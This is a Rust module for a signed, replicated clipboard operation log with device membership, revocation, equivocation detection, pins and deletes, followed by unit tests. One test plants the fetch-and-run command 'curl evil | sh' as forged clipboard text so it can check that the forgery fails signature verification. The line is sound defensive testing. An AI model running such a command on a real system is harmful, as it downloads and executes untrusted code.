//! The replicated operation log, with membership.
//!
//! Every device keeps every member's operations, each member's in `seq` order.
//! Peers sync by exchanging version vectors (the highest `seq` held per device)
//! and sending each other what is missing.
//!
//! # Trust
//!
//! Every operation is signed by its author and verified before it is stored.
//! Who counts as an author is itself decided by the log:
//!
//! - The group has a **root**: the device that created it. Every member agrees
//!   on the root (a joiner adopts it during pairing).
//! - `DeviceAdded { device }` by a member makes `device` a member.
//! - `DeviceRevoked { device, after_seq }` by a member sets a **cutoff**: the
//!   revoked device's operations with a higher `seq` are invalid everywhere.
//! - An operation is *effective* when its author is a member and its `seq` is
//!   within the author's cutoff.
//!
//! Membership is recomputed from scratch by [`derive_trust`], a deterministic
//! function of the root and the set of operations held. So every device that
//! holds the same operations reaches the same verdict, whatever order they
//! arrived in. Revocations are resolved in HLC order, and adds by fixpoint.
//!
//! Residual risk (documented in SECURITY.md): a member is fully trusted until
//! revoked, so a compromised member can race to revoke others. Detecting and
//! recovering from that needs a recovery key or a quorum, a later stage.

use std::collections::{BTreeMap, BTreeSet, VecDeque};

use crate::limits::{op_size, op_within_limits, MAX_OPS_PER_MESSAGE, MAX_PAGE_BYTES, MAX_TEXT_BYTES};
use crate::op::{item_hash, ItemRef};
use crate::{DeviceId, DeviceKey, Hlc, Op, OpKind, Timestamp};

/// Highest contiguous `seq` held for each device.
pub type VersionVector = BTreeMap<DeviceId, u64>;

/// A clipboard item's name: the `(device, seq)` of the operation that copied it.
pub type ItemId = (DeviceId, u64);

/// Pins and deletes, resolved from every effective operation held.
///
/// - A delete is a tombstone: once any effective `Delete` names an item, the
///   item is gone on every device, and no pin brings it back (delete wins).
/// - A pin is a last-writer-wins register per item: the effective `Pin` with
///   the highest `(order_key, seq)` decides.
/// - A pin or delete counts only if its [`ItemRef::hash`] matches the item's
///   text, so it cannot be aimed at a copy its author never saw.
///
/// Like membership, this is a function of the set of operations held, so
/// every device that holds the same operations reaches the same marks.
#[derive(Debug, Default, Clone, PartialEq, Eq)]
pub struct Marks {
    pub deleted: BTreeSet<ItemId>,
    pub pinned: BTreeSet<ItemId>,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum ApplyResult {
    /// New operation, now part of the log.
    Applied,
    /// Already held. Safe to ignore: application is idempotent.
    Duplicate,
    /// Arrived before an earlier operation from the same device. The caller
    /// should pull again; the operation will be re-sent in order.
    Gap { expected: u64 },
    /// The author is not (yet) known to be a member. It may become one when
    /// the operation that adds it arrives, so the sender will offer it again.
    UnknownAuthor,
    /// Permanently refused.
    Rejected(Rejection),
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Rejection {
    /// The signature does not match the author and contents.
    BadSignature,
    /// The author was revoked before this operation.
    Revoked,
    /// A different, validly signed operation already holds this `(device, seq)`:
    /// evidence of a compromised key or a device that lost its state.
    Equivocation,
    /// Exceeds the limits in [`crate::limits`].
    Malformed,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum LocalError {
    /// The text is larger than [`MAX_TEXT_BYTES`].
    TooLarge,
    /// The name is longer than [`crate::limits::MAX_NAME_BYTES`].
    NameTooLong,
}

/// The group as this log sees it.
#[derive(Debug, Clone, Default, PartialEq, Eq)]
pub struct Trust {
    /// Members, with the name each was added under (the root may have none).
    pub members: BTreeMap<DeviceId, String>,
    /// Revoked members: operations above this `seq` are invalid.
    pub cutoffs: BTreeMap<DeviceId, u64>,
}

impl Trust {
    /// Is this operation from a member and within its cutoff?
    pub fn accepts(&self, author: DeviceId, seq: u64) -> bool {
        self.members.contains_key(&author) && seq <= self.cutoff(author)
    }

    pub fn cutoff(&self, device: DeviceId) -> u64 {
        self.cutoffs.get(&device).copied().unwrap_or(u64::MAX)
    }

    /// A member that has not been revoked: may connect and author new operations.
    pub fn is_active(&self, device: DeviceId) -> bool {
        self.members.contains_key(&device) && !self.cutoffs.contains_key(&device)
    }
}

/// Recompute membership from the root and every operation held.
pub fn derive_trust<'a>(root: DeviceId, ops: impl Iterator<Item = &'a Op> + Clone) -> Trust {
    let adds: Vec<(&Op, DeviceId, &str)> = ops
        .clone()
        .filter_map(|op| match &op.kind {
            OpKind::DeviceAdded { device, name } => Some((op, *device, name.as_str())),
            _ => None,
        })
        .collect();
    let mut revokes: Vec<(&Op, DeviceId, u64)> = ops
        .filter_map(|op| match op.kind {
            OpKind::DeviceRevoked { device, after_seq } => Some((op, device, after_seq)),
            _ => None,
        })
        .collect();
    revokes.sort_by_key(|(op, _, _)| (op.order_key(), op.seq));

    let closure = |cutoffs: &BTreeMap<DeviceId, u64>| {
        let mut members = BTreeMap::from([(root, String::new())]);
        loop {
            let before = members.len();
            for (op, device, name) in &adds {
                let author_ok =
                    members.contains_key(&op.device) && op.seq <= cutoffs.get(&op.device).copied().unwrap_or(u64::MAX);
                if author_ok {
                    members.entry(*device).or_insert_with(|| (*name).to_string());
                }
            }
            if members.len() == before {
                return members;
            }
        }
    };

    let mut cutoffs: BTreeMap<DeviceId, u64> = BTreeMap::new();
    for (op, device, after_seq) in revokes {
        let trust = Trust { members: closure(&cutoffs), cutoffs: cutoffs.clone() };
        if trust.accepts(op.device, op.seq) {
            let c = cutoffs.entry(device).or_insert(after_seq);
            *c = (*c).min(after_seq);
        }
    }
    Trust { members: closure(&cutoffs), cutoffs }
}

#[derive(Debug, Default, Clone, PartialEq, Eq)]
pub struct BatchOutcome {
    pub applied: usize,
    pub duplicates: usize,
    pub rejected: usize,
    pub unknown_author: usize,
    /// Some operation arrived out of order; pull again.
    pub gap: bool,
    /// Membership changed: re-check connections against [`OpLog::trust`].
    pub membership_changed: bool,
    /// Authors caught signing two different operations with the same `seq`.
    pub equivocators: BTreeSet<DeviceId>,
}

#[derive(Debug, Clone)]
pub struct OpLog {
    key: DeviceKey,
    root: DeviceId,
    hlc: Hlc,
    /// `ops[d][i]` has `seq == i + 1`. Holds only effective operations, plus
    /// every operation this device authored.
    ops: BTreeMap<DeviceId, Vec<Op>>,
    trust: Trust,
}

impl OpLog {
    /// A new, single-device group rooted at this device.
    pub fn new(key: DeviceKey) -> Self {
        let root = key.id();
        let trust = derive_trust(root, std::iter::empty());
        Self { key, root, hlc: Hlc::new(), ops: BTreeMap::new(), trust }
    }

    pub fn me(&self) -> DeviceId {
        self.key.id()
    }

    pub fn root(&self) -> DeviceId {
        self.root
    }

    pub fn trust(&self) -> &Trust {
        &self.trust
    }

    pub fn clock(&self) -> Timestamp {
        self.hlc.last()
    }

    /// Join another group (during pairing). Membership is recomputed; this
    /// device becomes a member once the operation that adds it arrives.
    pub fn set_root(&mut self, root: DeviceId) {
        self.root = root;
        self.rederive();
    }

    /// This device has been revoked by the group.
    pub fn is_revoked(&self) -> bool {
        self.trust.cutoffs.contains_key(&self.me())
    }

    pub fn len(&self) -> usize {
        self.ops.values().map(Vec::len).sum()
    }

    pub fn is_empty(&self) -> bool {
        self.len() == 0
    }

    pub fn ops_from(&self, device: DeviceId) -> &[Op] {
        self.ops.get(&device).map(Vec::as_slice).unwrap_or(&[])
    }

    pub fn all_ops(&self) -> impl Iterator<Item = &Op> + Clone {
        self.ops.values().flatten()
    }

    /// Record a local change, signed by this device, and return it to broadcast.
    pub fn append_local(&mut self, kind: OpKind, physical_ms: u64) -> Result<Op, LocalError> {
        match &kind {
            OpKind::ClipboardText(t) if t.len() > MAX_TEXT_BYTES => return Err(LocalError::TooLarge),
            OpKind::DeviceAdded { name, .. } if name.len() > crate::limits::MAX_NAME_BYTES => {
                return Err(LocalError::NameTooLong)
            }
            _ => {}
        }
        let ts = self.hlc.tick(physical_ms);
        let me = self.me();
        let seq = self.ops_from(me).len() as u64 + 1;
        let op = Op::sign(&self.key, seq, ts, kind);
        let membership = op.is_membership();
        self.ops.entry(me).or_default().push(op.clone());
        if membership {
            self.rederive();
        }
        Ok(op)
    }

    /// Apply one operation received from a peer.
    pub fn apply_remote(&mut self, op: Op, physical_ms: u64) -> ApplyResult {
        if !op_within_limits(&op) {
            return ApplyResult::Rejected(Rejection::Malformed);
        }
        let have = self.ops_from(op.device).len() as u64;
        if op.seq <= have {
            let held = &self.ops[&op.device][op.seq as usize - 1];
            if *held == op {
                return ApplyResult::Duplicate;
            }
            return ApplyResult::Rejected(if op.signature_is_valid() {
                Rejection::Equivocation
            } else {
                Rejection::BadSignature
            });
        }
        // Cheap checks first, so a peer resending operations we will refuse
        // anyway cannot make us burn CPU on signature verification.
        // Our own operations may come back from a peer (after we lost state);
        // the signature proves they are ours. Anyone else must be a member.
        if op.device != self.me() {
            if !self.trust.members.contains_key(&op.device) {
                return ApplyResult::UnknownAuthor;
            }
            if op.seq > self.trust.cutoff(op.device) {
                return ApplyResult::Rejected(Rejection::Revoked);
            }
        }
        if op.seq != have + 1 {
            return ApplyResult::Gap { expected: have + 1 };
        }
        if !op.signature_is_valid() {
            return ApplyResult::Rejected(Rejection::BadSignature);
        }
        self.hlc.observe(op.ts, physical_ms);
        let membership = op.is_membership();
        self.ops.entry(op.device).or_default().push(op);
        if membership {
            self.rederive();
        }
        ApplyResult::Applied
    }

    /// Apply a batch, retrying operations whose author becomes known later in
    /// the same batch, until nothing more can be applied.
    pub fn apply_batch(&mut self, ops: Vec<Op>, physical_ms: u64) -> BatchOutcome {
        let mut out = BatchOutcome::default();
        let trust_before = self.trust.clone();
        let mut pending = ops;
        loop {
            let mut retry = Vec::new();
            let mut progressed = false;
            for op in pending {
                let author = op.device;
                match self.apply_remote(op.clone(), physical_ms) {
                    ApplyResult::Applied => {
                        out.applied += 1;
                        progressed = true;
                    }
                    ApplyResult::Duplicate => out.duplicates += 1,
                    ApplyResult::Gap { .. } => retry.push(op),
                    ApplyResult::UnknownAuthor => retry.push(op),
                    ApplyResult::Rejected(r) => {
                        out.rejected += 1;
                        if r == Rejection::Equivocation {
                            out.equivocators.insert(author);
                        }
                    }
                }
            }
            if retry.is_empty() || !progressed {
                for op in &retry {
                    let have = self.ops_from(op.device).len() as u64;
                    if op.seq > have + 1 {
                        out.gap = true;
                    } else if !self.trust.members.contains_key(&op.device) {
                        out.unknown_author += 1;
                    } else {
                        out.gap = true;
                    }
                }
                break;
            }
            pending = retry;
        }
        out.membership_changed = self.trust != trust_before;
        out
    }

    /// Recompute membership and drop operations that are no longer effective.
    fn rederive(&mut self) {
        let me = self.me();
        loop {
            self.trust = derive_trust(self.root, self.ops.values().flatten());
            let mut pruned = false;
            for (author, ops) in self.ops.iter_mut() {
                if *author == me {
                    continue; // a device always keeps what it authored
                }
                let keep = if self.trust.members.contains_key(author) {
                    self.trust.cutoff(*author).min(ops.len() as u64)
                } else {
                    0
                };
                if (keep as usize) < ops.len() {
                    ops.truncate(keep as usize);
                    pruned = true;
                }
            }
            self.ops.retain(|_, ops| !ops.is_empty());
            // Dropping operations can drop membership operations, so repeat
            // until membership is stable.
            if !pruned {
                return;
            }
        }
    }

    pub fn version_vector(&self) -> VersionVector {
        self.ops.iter().map(|(d, ops)| (*d, ops.len() as u64)).collect()
    }

    /// Authors in the order a newcomer can verify them: the root first, then
    /// each member after the member that added it.
    fn author_order(&self) -> Vec<DeviceId> {
        let mut order = Vec::new();
        let mut seen = BTreeSet::new();
        let mut queue = VecDeque::from([self.root]);
        while let Some(author) = queue.pop_front() {
            if !seen.insert(author) {
                continue;
            }
            order.push(author);
            for op in self.ops_from(author) {
                if let OpKind::DeviceAdded { device, .. } = op.kind {
                    queue.push_back(device);
                }
            }
        }
        order.extend(self.ops.keys().filter(|d| !seen.contains(d)).copied());
        order
    }

    /// Operations a peer with version vector `theirs` does not have yet, at
    /// most one page. Returns the page and whether more remain.
    pub fn missing_for(&self, theirs: &VersionVector) -> (Vec<Op>, bool) {
        let mut page = Vec::new();
        let mut bytes = 0usize;
        for author in self.author_order() {
            let have = theirs.get(&author).copied().unwrap_or(0) as usize;
            for op in self.ops_from(author).iter().skip(have) {
                let size = op_size(op);
                if page.len() == MAX_OPS_PER_MESSAGE || (!page.is_empty() && bytes + size > MAX_PAGE_BYTES) {
                    return (page, true);
                }
                bytes += size;
                page.push(op.clone());
            }
        }
        (page, false)
    }

    /// Clipboard history, newest first, without deleted items. Identical on
    /// every device that holds the same operations, whatever order they
    /// arrived in.
    pub fn clipboard_history(&self) -> Vec<&Op> {
        let deleted = self.marks().deleted;
        let mut items: Vec<&Op> = self
            .all_ops()
            .filter(|op| matches!(op.kind, OpKind::ClipboardText(_)))
            .filter(|op| self.is_effective(op) && !deleted.contains(&op.id()))
            .collect();
        items.sort_by_key(|op| std::cmp::Reverse(op.order_key()));
        items
    }

    /// This device's own operations always count; anyone else's only while
    /// their author is a member within its cutoff.
    fn is_effective(&self, op: &Op) -> bool {
        op.device == self.me() || self.trust.accepts(op.device, op.seq)
    }

    /// The clipboard text of item `id`, if it is held and effective.
    fn item_text(&self, id: ItemId) -> Option<&str> {
        let op = self.ops.get(&id.0)?.get(usize::try_from(id.1.checked_sub(1)?).ok()?)?;
        match &op.kind {
            OpKind::ClipboardText(text) if self.is_effective(op) => Some(text),
            _ => None,
        }
    }

    /// A reference to item `id` for a new pin or delete, if it is held,
    /// effective and not deleted.
    pub fn item_ref(&self, id: ItemId) -> Option<ItemRef> {
        let text = self.item_text(id)?;
        if self.marks().deleted.contains(&id) {
            return None;
        }
        Some(ItemRef { device: id.0, seq: id.1, hash: item_hash(text) })
    }

    /// Resolve every pin and delete held (see [`Marks`]).
    pub fn marks(&self) -> Marks {
        let matches = |r: &ItemRef| self.item_text((r.device, r.seq)).is_some_and(|t| item_hash(t) == r.hash);
        let mut marks = Marks::default();
        let mut latest_pin: BTreeMap<ItemId, ((Timestamp, DeviceId, u64), bool)> = BTreeMap::new();
        for op in self.all_ops().filter(|op| self.is_effective(op)) {
            match &op.kind {
                OpKind::Delete { item } if matches(item) => {
                    marks.deleted.insert((item.device, item.seq));
                }
                OpKind::Pin { item, pinned } if matches(item) => {
                    let key = (op.ts, op.device, op.seq);
                    let slot = latest_pin.entry((item.device, item.seq)).or_insert((key, *pinned));
                    if key > slot.0 {
                        *slot = (key, *pinned);
                    }
                }
                _ => {}
            }
        }
        marks.pinned = latest_pin
            .into_iter()
            .filter(|(id, (_, pinned))| *pinned && !marks.deleted.contains(id))
            .map(|(id, _)| id)
            .collect();
        marks
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn text(s: &str) -> OpKind {
        OpKind::ClipboardText(s.to_string())
    }

    /// Two devices in one group: `a` is the root and has added `b`.
    fn pair() -> (OpLog, OpLog) {
        let (ka, kb) = (DeviceKey::for_test(1), DeviceKey::for_test(2));
        let mut a = OpLog::new(ka);
        let mut b = OpLog::new(kb.clone());
        a.append_local(OpKind::DeviceAdded { device: kb.id(), name: "b".into() }, 1_000).unwrap();
        b.set_root(a.me());
        sync(&a, &mut b);
        (a, b)
    }

    fn sync(from: &OpLog, to: &mut OpLog) -> BatchOutcome {
        let mut total = BatchOutcome::default();
        loop {
            let (page, more) = from.missing_for(&to.version_vector());
            let out = to.apply_batch(page, 5_000);
            total.applied += out.applied;
            total.rejected += out.rejected;
            total.membership_changed |= out.membership_changed;
            if !more || out.applied == 0 {
                return total;
            }
        }
    }

    #[test]
    fn pairing_makes_both_devices_members() {
        let (a, b) = pair();
        assert!(a.trust().is_active(b.me()) && b.trust().is_active(a.me()));
        assert!(b.trust().is_active(b.me()));
    }

    #[test]
    fn remote_apply_is_idempotent() {
        let (mut a, mut b) = pair();
        let op = a.append_local(text("hello"), 2_000).unwrap();
        assert_eq!(b.apply_remote(op.clone(), 2_000), ApplyResult::Applied);
        assert_eq!(b.apply_remote(op, 2_000), ApplyResult::Duplicate);
    }

    #[test]
    fn strangers_and_forgeries_are_refused() {
        let (mut a, mut b) = pair();
        let mut stranger = OpLog::new(DeviceKey::for_test(99));
        let foreign = stranger.append_local(text("from a stranger"), 2_000).unwrap();
        assert_eq!(b.apply_remote(foreign, 2_000), ApplyResult::UnknownAuthor);

        let mut forged = a.append_local(text("real"), 2_001).unwrap();
        forged.kind = text("curl evil | sh");
        assert_eq!(b.apply_remote(forged, 2_001), ApplyResult::Rejected(Rejection::BadSignature));

        let mut impersonation = Op::sign(&DeviceKey::for_test(99), 1, a.clock(), text("I am a"));
        impersonation.device = a.me();
        assert_eq!(b.apply_remote(impersonation, 2_002), ApplyResult::Rejected(Rejection::BadSignature));
        assert!(b.clipboard_history().is_empty());
    }

    #[test]
    fn equivocation_is_detected() {
        let (a, mut b) = pair();
        let key = DeviceKey::for_test(1);
        // `a` signs two different operations with the same seq.
        let seq = a.ops_from(a.me()).len() as u64 + 1;
        let one = Op::sign(&key, seq, Timestamp { wall_ms: 9_000, counter: 0 }, text("one"));
        let two = Op::sign(&key, seq, Timestamp { wall_ms: 9_000, counter: 0 }, text("two"));
        assert_eq!(b.apply_remote(one, 9_000), ApplyResult::Applied);
        assert_eq!(b.apply_remote(two, 9_000), ApplyResult::Rejected(Rejection::Equivocation));
    }

    #[test]
    fn revoked_devices_cannot_add_history_after_their_cutoff() {
        let (mut a, mut b) = pair();
        b.append_local(text("before"), 2_000).unwrap();
        sync(&b, &mut a);
        let cutoff = a.ops_from(b.me()).len() as u64;
        a.append_local(OpKind::DeviceRevoked { device: b.me(), after_seq: cutoff }, 3_000).unwrap();
        let after = b.append_local(text("after revocation"), 3_500).unwrap();
        assert_eq!(a.apply_remote(after, 3_500), ApplyResult::Rejected(Rejection::Revoked));
        assert!(!a.trust().is_active(b.me()));
        sync(&a, &mut b);
        assert!(b.is_revoked(), "the revoked device learns it was revoked");
    }

    #[test]
    fn a_late_revocation_prunes_operations_already_accepted() {
        let (mut a, mut b) = pair();
        let mut c = OpLog::new(DeviceKey::for_test(3));
        a.append_local(OpKind::DeviceAdded { device: c.me(), name: "c".into() }, 1_500).unwrap();
        c.set_root(a.me());
        sync(&a, &mut c);
        sync(&a, &mut b);
        // b writes twice; c receives both, but a revokes b after the first.
        b.append_local(text("ok"), 2_000).unwrap();
        sync(&b, &mut a);
        b.append_local(text("compromised"), 2_100).unwrap();
        sync(&b, &mut c);
        assert_eq!(c.ops_from(b.me()).len(), 2);
        let cutoff = a.ops_from(b.me()).len() as u64;
        a.append_local(OpKind::DeviceRevoked { device: b.me(), after_seq: cutoff }, 3_000).unwrap();
        let out = sync(&a, &mut c);
        assert!(out.membership_changed);
        assert_eq!(c.ops_from(b.me()).len(), 1, "the op after the cutoff is dropped");
        assert_eq!(c.version_vector(), a.version_vector());
    }

    #[test]
    fn membership_does_not_depend_on_arrival_order() {
        // a adds b, b adds c: a newcomer learns c only through b.
        let (mut a, mut b) = pair();
        let kc = DeviceKey::for_test(3);
        b.append_local(OpKind::DeviceAdded { device: kc.id(), name: "c".into() }, 2_000).unwrap();
        let mut c = OpLog::new(kc);
        c.set_root(a.me());
        c.append_local(text("hello from c"), 2_500).unwrap();
        sync(&c, &mut a); // a cannot verify c yet
        assert_eq!(a.ops_from(c.me()).len(), 0);
        sync(&b, &mut a);
        sync(&c, &mut a);
        assert_eq!(a.ops_from(c.me()).len(), 1);
        // Every device agrees on membership.
        sync(&a, &mut b);
        sync(&a, &mut c);
        assert_eq!(a.trust(), b.trust());
        assert_eq!(a.trust(), c.trust());
    }

    #[test]
    fn pages_are_bounded() {
        let (mut a, mut b) = pair();
        for i in 0..(MAX_OPS_PER_MESSAGE + 10) {
            a.append_local(text(&format!("item {i}")), 2_000 + i as u64).unwrap();
        }
        let (page, more) = a.missing_for(&b.version_vector());
        assert_eq!(page.len(), MAX_OPS_PER_MESSAGE);
        assert!(more);
        sync(&a, &mut b);
        assert_eq!(b.version_vector(), a.version_vector());
    }

    #[test]
    fn oversized_text_is_refused_locally_and_remotely() {
        let (mut a, _) = pair();
        assert_eq!(a.append_local(text(&"x".repeat(MAX_TEXT_BYTES + 1)), 2_000), Err(LocalError::TooLarge));
    }

    #[test]
    fn history_order_is_the_same_on_every_device() {
        let (mut a, mut b) = pair();
        let op_a = a.append_local(text("from a"), 4_000).unwrap();
        let op_b = b.append_local(text("from b"), 4_000).unwrap();
        a.apply_remote(op_b, 4_001);
        b.apply_remote(op_a, 4_001);
        let ids = |log: &OpLog| log.clipboard_history().iter().map(|op| op.id()).collect::<Vec<_>>();
        assert_eq!(ids(&a), ids(&b));
    }

    // --- Pins and deletes ---

    fn ids(log: &OpLog) -> Vec<ItemId> {
        log.clipboard_history().iter().map(|op| op.id()).collect()
    }

    fn pin(log: &mut OpLog, id: ItemId, pinned: bool, t: u64) -> Op {
        let item = log.item_ref(id).expect("item held");
        log.append_local(OpKind::Pin { item, pinned }, t).unwrap()
    }

    fn delete(log: &mut OpLog, id: ItemId, t: u64) -> Op {
        let item = log.item_ref(id).expect("item held");
        log.append_local(OpKind::Delete { item }, t).unwrap()
    }

    #[test]
    fn a_delete_hides_the_item_everywhere_even_if_it_arrives_first() {
        let (mut a, mut b) = pair();
        let copy = a.append_local(text("oops, a password"), 4_000).unwrap();
        let mut c = a.clone(); // a third view that sees the delete before the copy
        sync(&a, &mut b);
        let del = delete(&mut b, copy.id(), 5_000);
        assert!(ids(&b).is_empty());

        a.apply_batch(vec![del.clone()], 5_001);
        assert!(ids(&a).is_empty(), "the author's own history follows the delete");

        // Delete first, then the copy it names: hidden as soon as both are held.
        let mut fresh = OpLog::new(DeviceKey::for_test(2));
        fresh.set_root(a.root());
        let all: Vec<Op> = a.all_ops().filter(|op| op.id() != copy.id()).cloned().collect();
        fresh.apply_batch(all, 6_000);
        fresh.apply_batch(vec![copy], 6_001);
        assert!(ids(&fresh).is_empty());
        assert!(c.item_ref((a.me(), 2)).is_some(), "an undeleted view still offers the item");
        c.apply_batch(vec![del], 6_002);
        assert!(c.item_ref((a.me(), 2)).is_none(), "a deleted item cannot be pinned or deleted again");
    }

    #[test]
    fn delete_wins_over_a_concurrent_or_later_pin() {
        let (mut a, mut b) = pair();
        let copy = a.append_local(text("item"), 4_000).unwrap();
        sync(&a, &mut b);
        let item = b.item_ref(copy.id()).unwrap();
        let del = delete(&mut a, copy.id(), 5_000);
        // B pins after A's delete (by clock), not having seen it.
        let late_pin = b.append_local(OpKind::Pin { item, pinned: true }, 9_000).unwrap();
        a.apply_batch(vec![late_pin], 9_001);
        b.apply_batch(vec![del], 9_002);
        for log in [&a, &b] {
            assert!(ids(log).is_empty());
            assert!(log.marks().pinned.is_empty(), "a deleted item is never pinned");
        }
    }

    #[test]
    fn the_latest_pin_wins_in_any_arrival_order() {
        let (mut a, mut b) = pair();
        let copy = a.append_local(text("item"), 4_000).unwrap();
        sync(&a, &mut b);
        let pin_a = pin(&mut a, copy.id(), true, 5_000);
        let unpin_b = pin(&mut b, copy.id(), false, 6_000);
        let pin_again_a = pin(&mut a, copy.id(), true, 5_500); // earlier than B's unpin
        a.apply_batch(vec![unpin_b.clone()], 7_000);
        b.apply_batch(vec![pin_again_a.clone(), pin_a.clone()], 7_000);
        assert_eq!(a.marks(), b.marks());
        assert!(a.marks().pinned.is_empty(), "B's unpin is the latest");

        // A later pin from A wins again.
        let pin_last = pin(&mut a, copy.id(), true, 8_000);
        b.apply_batch(vec![pin_last], 8_001);
        assert_eq!(a.marks(), b.marks());
        assert_eq!(a.marks().pinned, BTreeSet::from([copy.id()]));
    }

    #[test]
    fn a_pin_or_delete_with_the_wrong_hash_does_nothing() {
        let (mut a, mut b) = pair();
        // B aims at A's next copy before it exists, guessing its text wrong.
        let future = ItemRef { device: a.me(), seq: 2, hash: item_hash("a guess") };
        let pre_delete = b.append_local(OpKind::Delete { item: future }, 4_000).unwrap();
        let pre_pin = b.append_local(OpKind::Pin { item: future, pinned: true }, 4_001).unwrap();
        a.apply_batch(vec![pre_delete, pre_pin], 4_002);
        let copy = a.append_local(text("the real text"), 5_000).unwrap();
        assert_eq!(copy.id(), (a.me(), 2));
        assert_eq!(ids(&a), vec![copy.id()], "the copy is not hidden");
        assert_eq!(a.marks(), Marks::default());
    }

    #[test]
    fn a_revoked_devices_later_deletes_do_not_count() {
        let (mut a, mut b) = pair();
        let copy = a.append_local(text("keep me"), 4_000).unwrap();
        sync(&a, &mut b);
        let cutoff = a.ops_from(b.me()).len() as u64;
        let revoke = a.append_local(OpKind::DeviceRevoked { device: b.me(), after_seq: cutoff }, 5_000).unwrap();
        let del = delete(&mut b, copy.id(), 6_000); // B was compromised and deletes anyway
        a.apply_batch(vec![del], 6_001);
        assert_eq!(ids(&a), vec![copy.id()]);
        b.apply_batch(vec![revoke], 6_002);
        assert!(b.is_revoked());
    }
}
